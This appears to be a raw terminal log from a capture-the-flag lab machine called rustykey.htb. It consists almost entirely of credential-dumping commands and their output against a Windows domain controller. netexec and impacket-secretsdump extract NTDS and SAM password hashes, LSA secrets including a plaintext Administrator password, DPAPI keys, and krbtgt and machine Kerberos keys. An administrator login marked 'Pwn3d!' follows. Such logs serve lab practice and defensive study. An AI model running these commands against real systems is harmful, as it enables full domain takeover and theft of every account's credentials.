+SMB         dc.rustykey.htb 445    dc               rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::
+SMB         dc.rustykey.htb 445    dc               DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
+SMB         dc.rustykey.htb 445    dc               Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2:::
+SMB         dc.rustykey.htb 445    dc               Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32:::
+SMB         dc.rustykey.htb 445    dc               Support-Computer3$:1105:aad3b435b51404eeaad3b435b51404ee:43c00d56ff9545109c016bbfcbd32bee:::
+SMB         dc.rustykey.htb 445    dc               Support-Computer4$:1106:aad3b435b51404eeaad3b435b51404ee:c52b0a68cb4e24e088164e2e5cf2b98a:::
+SMB         dc.rustykey.htb 445    dc               Support-Computer5$:1107:aad3b435b51404eeaad3b435b51404ee:2f312c564ecde3769f981c5d5b32790a:::
+SMB         dc.rustykey.htb 445    dc               Finance-Computer1$:1118:aad3b435b51404eeaad3b435b51404ee:d6a32714fa6c8b5e3ec89d4002adb495:::
+SMB         dc.rustykey.htb 445    dc               Finance-Computer2$:1119:aad3b435b51404eeaad3b435b51404ee:49c0d9e13319c1cb199bc274ee14b04c:::
+SMB         dc.rustykey.htb 445    dc               Finance-Computer3$:1120:aad3b435b51404eeaad3b435b51404ee:65f129254bea10ac4be71e453f6cabca:::
+SMB         dc.rustykey.htb 445    dc               Finance-Computer4$:1121:aad3b435b51404eeaad3b435b51404ee:ace1db31d6aeb97059bf3efb410df72f:::
+SMB         dc.rustykey.htb 445    dc               Finance-Computer5$:1122:aad3b435b51404eeaad3b435b51404ee:b53f4333805f80406b4513e60ef83457:::
+SMB         dc.rustykey.htb 445    dc               IT-Computer1$:1123:aad3b435b51404eeaad3b435b51404ee:fe60afe8d9826130f0e06cd2958a8a61:::
+SMB         dc.rustykey.htb 445    dc               IT-Computer2$:1124:aad3b435b51404eeaad3b435b51404ee:73d844e19c8df244c812d4be1ebcff80:::
+SMB         dc.rustykey.htb 445    dc               IT-Computer3$:1125:aad3b435b51404eeaad3b435b51404ee:b52b582f02f8c0cd6320cd5eab36d9c6:::
+SMB         dc.rustykey.htb 445    dc               IT-Computer4$:1126:aad3b435b51404eeaad3b435b51404ee:763f9ea340ccd5571c1ffabf88cac686:::
+SMB         dc.rustykey.htb 445    dc               IT-Computer5$:1127:aad3b435b51404eeaad3b435b51404ee:1679431d1c52638688b4f1321da14045:::
+SMB         dc.rustykey.htb 445    dc               [+] Dumped 27 NTDS hashes to /root/.nxc/logs/ntds/dc_dc.rustykey.htb_2025-11-14_085108.ntds of which 11 were added to the database
+SMB         dc.rustykey.htb 445    dc               [*] To extract only enabled accounts from the output file, run the following command:
+SMB         dc.rustykey.htb 445    dc               [*] cat /root/.nxc/logs/ntds/dc_dc.rustykey.htb_2025-11-14_085108.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         dc.rustykey.htb 445    dc               [*] grep -iv disabled /root/.nxc/logs/ntds/dc_dc.rustykey.htb_2025-11-14_085108.ntds | cut -d ':' -f1
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache impacket-secretsdump -k -no-pass 'rustykey.htb/backupadmin@dc.rustykey.htb'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x94660760272ba2c07b13992b57b432d4
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3aac437da6f5ae94b01a6e5347dd920:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+RUSTYKEY\DC$:plain_password_hex:0c7fbe96b20b5afd1da58a1d71a2dbd6ac75b42a93de3c18e4b7d448316ca40c74268fb0d2281f46aef4eba9cd553bbef21896b316407ae45ef212b185b299536547a7bd796da250124a6bb3064ae48ad3a3a74bc5f4d8fbfb77503eea0025b3194af0e290b16c0b52ca4fecbf9cfae6a60b24a4433c16b9b6786a9d212c7aaefefa417fe33cc7f4dcbe354af5ce95f407220bada9b4d841a3aa7c6231de9a9ca46a0621040dc384043e19800093303e1485021289d8719dd426d164e90ee3db3914e3d378cc9e80560f20dcb64b488aa468c1b71c2bac3addb4a4d55231d667ca4ba2ad36640985d9b18128f7755b25
+RUSTYKEY\DC$:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
+[*] DefaultPassword 
+RUSTYKEY\Administrator:Rustyrc4key#!
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x3c06efaf194382750e12c00cd141d275522d8397
+dpapi_userkey:0xb833c05f4c4824a112f04f2761df11fefc578f5c
+[*] NL$KM 
+ 0000   6A 34 14 2E FC 1A C2 54  64 E3 4C F1 A7 13 5F 34   j4.....Td.L..._4
+ 0010   79 98 16 81 90 47 A1 F0  8B FC 47 78 8C 7B 76 B6   y....G....Gx.{v.
+ 0020   C0 E4 94 9D 1E 15 A6 A9  70 2C 13 66 D7 23 A1 0B   ........p,.f.#..
+ 0030   F1 11 79 34 C1 8F 00 15  7B DF 6F C7 C3 B4 FC FE   ..y4....{.o.....
+NL$KM:6a34142efc1ac25464e34cf1a7135f34799816819047a1f08bfc47788c7b76b6c0e4949d1e15a6a9702c1366d723a10bf1117934c18f00157bdf6fc7c3b4fcfe
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7a351e12f70cc177a1d5bd11b28ac26:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f4ad30fa8d8f2cfa198edd4301e5b0f3:::
+rustykey.htb\rr.parker:1137:aad3b435b51404eeaad3b435b51404ee:d0c72d839ef72c7d7a2dae53f7948787:::
+rustykey.htb\mm.turner:1138:aad3b435b51404eeaad3b435b51404ee:7a35add369462886f2b1f380ccec8bca:::
+rustykey.htb\bb.morgan:1139:aad3b435b51404eeaad3b435b51404ee:44c72edbf1d64dc2ec4d6d8bc24160fc:::
+rustykey.htb\gg.anderson:1140:aad3b435b51404eeaad3b435b51404ee:93290d859744f8d07db06d5c7d1d4e41:::
+rustykey.htb\dd.ali:1143:aad3b435b51404eeaad3b435b51404ee:20e03a55dcf0947c174241c0074e972e:::
+rustykey.htb\ee.reed:1145:aad3b435b51404eeaad3b435b51404ee:4dee0d4ff7717c630559e3c3c3025bbf:::
+rustykey.htb\nn.marcos:1146:aad3b435b51404eeaad3b435b51404ee:33aa36a7ec02db5f2ec5917ee544c3fa:::
+rustykey.htb\backupadmin:3601:aad3b435b51404eeaad3b435b51404ee:34ed39bc39d86932b1576f23e66e3451:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:b266231227e43be890e63468ab168790:::
+Support-Computer1$:1103:aad3b435b51404eeaad3b435b51404ee:5014a29553f70626eb1d1d3bff3b79e2:::
+Support-Computer2$:1104:aad3b435b51404eeaad3b435b51404ee:613ce90991aaeb5187ea198c629bbf32:::
+Support-Computer3$:1105:aad3b435b51404eeaad3b435b51404ee:43c00d56ff9545109c016bbfcbd32bee:::
+Support-Computer4$:1106:aad3b435b51404eeaad3b435b51404ee:c52b0a68cb4e24e088164e2e5cf2b98a:::
+Support-Computer5$:1107:aad3b435b51404eeaad3b435b51404ee:2f312c564ecde3769f981c5d5b32790a:::
+Finance-Computer1$:1118:aad3b435b51404eeaad3b435b51404ee:d6a32714fa6c8b5e3ec89d4002adb495:::
+Finance-Computer2$:1119:aad3b435b51404eeaad3b435b51404ee:49c0d9e13319c1cb199bc274ee14b04c:::
+Finance-Computer3$:1120:aad3b435b51404eeaad3b435b51404ee:65f129254bea10ac4be71e453f6cabca:::
+Finance-Computer4$:1121:aad3b435b51404eeaad3b435b51404ee:ace1db31d6aeb97059bf3efb410df72f:::
+Finance-Computer5$:1122:aad3b435b51404eeaad3b435b51404ee:b53f4333805f80406b4513e60ef83457:::
+IT-Computer1$:1123:aad3b435b51404eeaad3b435b51404ee:fe60afe8d9826130f0e06cd2958a8a61:::
+IT-Computer2$:1124:aad3b435b51404eeaad3b435b51404ee:73d844e19c8df244c812d4be1ebcff80:::
+IT-Computer3$:1125:aad3b435b51404eeaad3b435b51404ee:b52b582f02f8c0cd6320cd5eab36d9c6:::
+IT-Computer4$:1126:aad3b435b51404eeaad3b435b51404ee:763f9ea340ccd5571c1ffabf88cac686:::
+IT-Computer5$:1127:aad3b435b51404eeaad3b435b51404ee:1679431d1c52638688b4f1321da14045:::
+[*] Kerberos keys grabbed
+Administrator:des-cbc-md5:e007705d897310cd
+krbtgt:aes256-cts-hmac-sha1-96:ee3271eb3f7047d423c8eeaf1bd84f4593f1f03ac999a3d7f3490921953d542a
+krbtgt:aes128-cts-hmac-sha1-96:24465a36c2086d6d85df701553a428af
+krbtgt:des-cbc-md5:d6d062fd1fd32a64
+rustykey.htb\rr.parker:des-cbc-md5:8c5b3b54b9688aa1
+rustykey.htb\mm.turner:aes256-cts-hmac-sha1-96:707ba49ed61c6575bfe9a3fd1541fc008e8803bfb0d7b5d21122cc464f39cbb9
+rustykey.htb\mm.turner:aes128-cts-hmac-sha1-96:a252d2716a0b365649eaec02f84f12c8
+rustykey.htb\mm.turner:des-cbc-md5:a46ea77c13854945
+rustykey.htb\bb.morgan:des-cbc-md5:d6ef5e57a2abb93b
+rustykey.htb\gg.anderson:des-cbc-md5:8923850da84f2c0d
+rustykey.htb\dd.ali:des-cbc-md5:613da45e3bef34a7
+rustykey.htb\ee.reed:des-cbc-md5:2fc46d9b898a4a29
+rustykey.htb\nn.marcos:aes256-cts-hmac-sha1-96:53ee5251000622bf04e80b5a85a429107f8284d9fe1ff5560a20ec8626310ee8
+rustykey.htb\nn.marcos:aes128-cts-hmac-sha1-96:cf00314169cb7fea67cfe8e0f7925a43
+rustykey.htb\nn.marcos:des-cbc-md5:e358835b1c238661
+rustykey.htb\backupadmin:des-cbc-md5:625e25fe70a77358
+DC$:des-cbc-md5:915d9d52a762675d
+Support-Computer1$:aes256-cts-hmac-sha1-96:89a52d7918588ddbdae5c4f053bbc180a41ed703a30c15c5d85d123457eba5fc
+Support-Computer1$:aes128-cts-hmac-sha1-96:3a6188fdb03682184ff0d792a81dd203
+Support-Computer1$:des-cbc-md5:c7cb8a76c76dfed9
+Support-Computer2$:aes256-cts-hmac-sha1-96:50f8a3378f1d75df813db9d37099361a92e2f2fb8fcc0fc231fdd2856a005828
+Support-Computer2$:aes128-cts-hmac-sha1-96:5c3fa5c32427fc819b10f9b9ea4be616
+Support-Computer2$:des-cbc-md5:a2a202ec91e50b6d
+Support-Computer3$:aes256-cts-hmac-sha1-96:e3b7b8876ac617dc7d2ba6cd2bea8de74db7acab2897525dfd284c43c8427954
+Support-Computer3$:aes128-cts-hmac-sha1-96:1ea036e381f3279293489c19cfdeb6c1
+Support-Computer3$:des-cbc-md5:c13edcfe4676f86d
+Support-Computer4$:aes256-cts-hmac-sha1-96:1708c6a424ed59dedc60e980c8f2ab88f6e2bb1bfe92ec6971c8cf5a40e22c1e
+Support-Computer4$:aes128-cts-hmac-sha1-96:9b6d33ef93c69721631b487dc00d3047
+Support-Computer4$:des-cbc-md5:3b79647680e0d57a
+Support-Computer5$:aes256-cts-hmac-sha1-96:464551486df4086accee00d3d37b60de581ee7adad2a6a31e3730fad3dfaed42
+Support-Computer5$:aes128-cts-hmac-sha1-96:1ec0c93b7f9df69ff470e2e05ff4ba89
+Support-Computer5$:des-cbc-md5:73abb53162d51fb3
+Finance-Computer1$:aes256-cts-hmac-sha1-96:a57ce3a3e4ee34bc08c8538789fa6f99f5e8fb200a5f77741c5bf61b3d899918
+Finance-Computer1$:aes128-cts-hmac-sha1-96:e62b7b772aba6668af65e9d1422e6aea
+Finance-Computer1$:des-cbc-md5:d9914cf29e76f8df
+Finance-Computer2$:aes256-cts-hmac-sha1-96:4d45b576dbd0eab6f4cc9dc75ff72bffe7fae7a2f9dc50b5418e71e8dc710703
+Finance-Computer2$:aes128-cts-hmac-sha1-96:3fd0dd200120ca90b43af4ab4e344a78
+Finance-Computer2$:des-cbc-md5:23ef512fb3a8d37c
+Finance-Computer3$:aes256-cts-hmac-sha1-96:1b2280d711765eb64bdb5ab1f6b7a3134bc334a3661b3335f78dd590dee18b0d
+Finance-Computer3$:aes128-cts-hmac-sha1-96:a25859c88f388ae7134b54ead8df7466
+Finance-Computer3$:des-cbc-md5:2a688a43ab40ecba
+Finance-Computer4$:aes256-cts-hmac-sha1-96:291adb0905f3e242748edd1c0ecaab34ca54675594b29356b90da62cf417496f
+Finance-Computer4$:aes128-cts-hmac-sha1-96:81fed1f0eeada2f995ce05bbf7f8f951
+Finance-Computer4$:des-cbc-md5:6b7532c83bc84c49
+Finance-Computer5$:aes256-cts-hmac-sha1-96:6171c0240ae0ce313ecbd8ba946860c67903b12b77953e0ee38005744507e3de
+Finance-Computer5$:aes128-cts-hmac-sha1-96:8e6aa26b24cdda2d7b5474b9a3dc94dc
+Finance-Computer5$:des-cbc-md5:92a72f7f865bb6cd
+IT-Computer1$:aes256-cts-hmac-sha1-96:61028ace6c840a6394517382823d6485583723f9c1f98097727ad3549d833b1e
+IT-Computer1$:aes128-cts-hmac-sha1-96:7d1a98937cb221fee8fcf22f1a16b676
+IT-Computer1$:des-cbc-md5:019d29370ece8002
+IT-Computer2$:aes256-cts-hmac-sha1-96:e9472fb1cf77df86327e5775223cf3d152e97eebd569669a6b22280316cf86fa
+IT-Computer2$:aes128-cts-hmac-sha1-96:a80fba15d78f66477f0591410a4ffda7
+IT-Computer2$:des-cbc-md5:622f2ae961abe932
+IT-Computer3$:aes256-cts-hmac-sha1-96:7871b89896813d9e4a732a35706fe44f26650c3da47e8db4f18b21cfbb7fbecb
+IT-Computer3$:aes128-cts-hmac-sha1-96:0e14a9e6fd52ab14e36703c1a4c542e3
+IT-Computer3$:des-cbc-md5:f7025180cd23e5f1
+IT-Computer4$:aes256-cts-hmac-sha1-96:68f2e30ca6b60ec1ab75fab763087b8772485ee19a59996a27af41a498c57bbc
+IT-Computer4$:aes128-cts-hmac-sha1-96:181ffb2653f2dc5974f2de924f0ac24a
+IT-Computer4$:des-cbc-md5:bf58cb437340cd3d
+IT-Computer5$:aes256-cts-hmac-sha1-96:417a87cdc95cb77997de6cdf07d8c9340626c7f1fbd6efabed86607e4cfd21b8
+IT-Computer5$:aes128-cts-hmac-sha1-96:873fd89f24e79dcd0affe6f63c51ec9a
+IT-Computer5$:des-cbc-md5:ad5eec6bcd4f86f7
+[*] Cleaning up... 
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# netexec smb dc.rustykey.htb -u administrator -p 'Rustyrc4key#!' -k
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\administrator:Rustyrc4key#! (Pwn3d!)
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+
+
+
